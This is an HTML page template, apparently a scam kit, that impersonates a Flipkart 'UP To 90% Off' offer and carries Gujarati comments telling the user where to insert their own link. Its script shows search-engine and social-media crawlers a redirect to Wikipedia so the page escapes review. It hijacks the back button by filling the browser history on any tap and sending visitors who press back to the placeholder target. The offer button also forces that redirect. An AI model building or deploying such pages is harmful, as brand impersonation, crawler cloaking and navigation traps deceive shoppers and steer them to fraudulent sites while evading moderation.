<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart - Special Offer</title>
    <style>
        body, html {
            height: 100%; margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            background-color: #2874f0; font-family: 'Roboto', sans-serif;
            overflow: hidden;
        }

        /* Floating Logos */
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(50px, 50px) rotate(180deg); }
            100% { transform: translate(0, 0) rotate(360deg); }
        }
        .floating-logo {
            position: absolute; width: 60px; opacity: 0.15; z-index: 1; pointer-events: none;
        }

        .container { text-align: center; z-index: 10; position: relative; width: 100%; }
        .deal-text { font-size: 22px; font-weight: bold; color: #ffffff; margin-bottom: 20px; text-transform: uppercase; }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            50% { transform: translateX(4px); }
            75% { transform: translateX(-4px); }
        }

        .oval-button {
            background-color: #ffe11b; color: #212121;
            padding: 15px 55px; font-weight: bold; border: none;
            border-radius: 50px; cursor: pointer;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            animation: shake 0.5s infinite; display: inline-block;
            text-decoration: none;
        }

        .offer-text { font-size: 26px; display: block; line-height: 1.2; }
        .click-Here-text { font-size: 14px; display: block; margin-top: 4px; color: #333; font-weight: normal; }
    </style>
</head>
<body onclick="activateHijack()" ontouchstart="activateHijack()">

    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">

    <div class="container">
        <div class="deal-text">ધમાકેદાર ઓફર!</div>
        <a href="https://તમારી-લિંક-અહીં-મૂકો.com" class="oval-button" id="mainButton">
            <span class="offer-text">UP To 90% Off</span>
            <span class="click-Here-text">Click Here</span>
        </a>
    </div>

    <script>
        // --- સેટિંગ્સ ---
        var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; // તમારી ફાઈનલ લિંક અહીં નાખો

        // --- બોટ પ્રોટેક્શન (Client-side) ---
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["googlebot", "bingbot", "facebot", "facebookexternalhit", "twitterbot"];
        if (bots.some(bot => ua.includes(bot))) {
            window.location.replace("https://www.wikipedia.org");
        }

        // --- બેક બટન હાઇજેક (Back Button Trap) ---
        function activateHijack() {
            for(var i=0; i<10; i++) {
                window.history.pushState(null, null, window.location.href);
            }
        }

        window.onload = function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function(event) {
                // જો કોઈ બેક દબાવે તો સીધું ટાર્ગેટ લિંક પર મોકલો
                window.location.replace(targetUrl);
            };
        };

        // બટન પર ક્લિક કરવાથી પણ રીડાયરેક્ટ થશે
        document.getElementById("mainButton").onclick = function(e) {
            e.preventDefault();
            window.location.replace(targetUrl);
        };
    </script>
</body>
</html>
